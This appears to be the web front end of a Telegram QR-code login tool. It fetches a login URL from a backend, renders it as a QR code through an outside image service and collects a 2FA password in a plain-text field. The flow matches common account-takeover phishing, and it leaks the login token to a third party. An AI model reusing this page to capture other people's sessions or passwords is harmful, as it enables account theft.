<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Telegram QR Login</title>
    <style>
        body {
            font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
            padding: 40px;
        }
        img {
            border: 1px solid #ccc;
        }
        /* status UI removed; status handling is server-side logging only */
    </style>
</head>
<body>

<h2>Telegram QR Login</h2>

<button onclick="start()">Start login</button>
<br><br>

<img id="qr" width="300" alt="Telegram QR code">
<br><br>


<div id="password-area" style="display:none">
    <input id="password" placeholder="2FA password">
    <button onclick="sendPassword()">Send password</button>
</div>

<script>
    let loginId = null

    async function start() {
        console.log("Starting login")

        try {
            const res = await fetch("/auth/start", {
                method: "POST"
            })

            if (!res.ok) {
                throw new Error("Backend error: " + res.status)
            }

            const data = await res.json()
            loginId = data.login_id

            document.getElementById("qr").src =
                "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" +
                encodeURIComponent(data.qr_url)
            console.log("QR shown; waiting for scan")

        } catch (e) {
            console.error(e)
            alert("Start login failed. Check console.")
        }
    }

    // NOTE: polling/status removed â€” status reporting is now server-side logging only.
    // WebSocket: listen for server events (need_password / authorized)
    (function setupWS(){
        const proto = location.protocol === 'https:' ? 'wss:' : 'ws:'
        const wsUrl = `${proto}//${location.host}/auth/ws/messages`
        let ws
        try {
            ws = new WebSocket(wsUrl)
        } catch (e) {
            console.error('WS connect failed', e)
            return
        }

        ws.onopen = () => console.log('WS connected')
        ws.onclose = () => console.log('WS closed')
        ws.onerror = (e) => console.error('WS error', e)
        ws.onmessage = (ev) => {
            try {
                const msg = JSON.parse(ev.data)
                // Expect messages like { type: 'need_password'|'authorized', login_id: '...' }
                if (!msg || !msg.type) return
                if (msg.login_id && msg.login_id !== loginId) return

                if (msg.type === 'need_password') {
                    document.getElementById('password-area').style.display = 'block'
                    console.log('2FA required for login', msg.login_id)
                }
                if (msg.type === 'authorized') {
                    // On successful authorization navigate to the next page
                    console.log('Authorized', msg.login_id)
                    window.location.href = '/next'
                }
            } catch (e) {
                console.error('WS message parse error', e)
            }
        }
    })()
    async function sendPassword() {
        if (!loginId) {
            alert("Start login first")
            return
        }

        const pwd = document.getElementById("password").value

        try {
            await fetch("/auth/password", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    login_id: loginId,
                    password: pwd
                })
            })
        } catch (e) {
            console.error(e)
            alert("Password submit failed")
        }
    }
</script>

</body>
</html>
